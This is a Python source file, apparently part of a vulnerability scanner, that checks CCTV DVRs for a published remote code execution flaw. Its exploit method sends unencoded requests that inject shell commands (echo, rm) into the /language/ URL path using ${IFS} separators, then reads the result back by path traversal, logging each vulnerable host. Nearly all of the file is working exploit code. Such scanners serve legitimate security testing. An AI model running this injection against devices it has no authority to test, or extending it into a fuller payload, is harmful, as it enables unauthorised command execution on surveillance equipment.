# http://www.kerneronsec.com/2016/02/remote-code-execution-in-cctv-dvrs-of.html
#__author__ = 'Rotem Kerner'
# Class-style implemented by Lorenzo Comi

from urllib.parse import urlparse
import socket
import requests
from requests.exceptions import ConnectionError, Timeout
from socket import timeout
import logging


# Console colors
W = '\033[0m'  # white (normal)
R = '\033[31m' # red
G = '\033[32m' # green



class NextTarget(Exception):
    pass


class H264_dvr_rce(object):

    def __init__(self, target_list):
        self.targets = target_list
        self.findings = []


    def raw_url_request(self, url):
        """
        Disabling URL encode hack
        :param url:
        :return:
        """
        try:
            r = requests.Request('GET')
            r.url = url
            r = r.prepare()
            # set url without encoding
            r.url = url
            s = requests.Session()
        except ConnectionError:
            logging.warning(R+'Url Error'+W)
            return False
        return s.send(r)


    def exploit(self):
        """
        exploits exploits: remote-code-execution-in-cctv-dvrs
        :return:
        """
        for target in self.targets:
            port = target.split(':')[1]
            try:
                if str(port) == '443': #TODO gestire SSL error
                    raise NextTarget #TODO gestire SSL error
                else:
                    ip = 'http://'+target.split(':')[0]
                    logging.info('Testing: %s' % (target))
                target_url = urlparse(ip)
                logging.debug('URL: '+ str(target_url))

                # validating hostname
                if not target_url.hostname:
                    logging.warning(R+"Supplied target \"%s\" is not a valid URL" % target +W)
                    raise NextTarget

                # A little hack to handle read timeouts, since urllib2 doesnt give us this functionality.
                socket.setdefaulttimeout(10)

                # check if target url is vulnerable.
                logging.debug("Checking if target \"%s\" is vulnerable..." % target_url.netloc)

                try:
                    # Write file test
                    self.raw_url_request('%s://%s:%s/language/Swedish${IFS}&&echo${IFS}1>test&&tar${IFS}/string.js'
                                     % (target_url.scheme, target_url.netloc, str(port)))

                    # Read the file.
                    response = self.raw_url_request('%s://%s:%s/../../../../../../../mnt/mtd/test' % (
                        target_url.scheme, target_url.netloc, str(port)))

                    # remove it..
                    self.raw_url_request('%s://%s:%s/language/Swedish${IFS}&&rm${IFS}test&&tar${IFS}/string.js'
                                     % (target_url.scheme, target_url.netloc, str(port)))

                except (ConnectionError, Timeout, timeout) as e:
                    logging.warning(R+"Unable to connect. reason: %s.  exiting..." % str(e)+W)
                    raise NextTarget
                try:
                    if response.text[0] == '1':
                        logging.info(G+"Target \"%s\" is vulnerable!" % target_url.netloc +W)
                        finding = ip + ';' + port + ';' + 'HTTP' + ';' + 'Remote Code Execution' + ';' + 'H264-DVR-RCE' + ';' + 'URL: ' + target_url.netloc
                        self.findings.append(finding)
                    else:
                        logging.debug(R+"Expected response content first char to be '1' got %s. exiting..." % response.text +W)
                except Exception:
                    pass
            except NextTarget:
                continue

        return self.findings
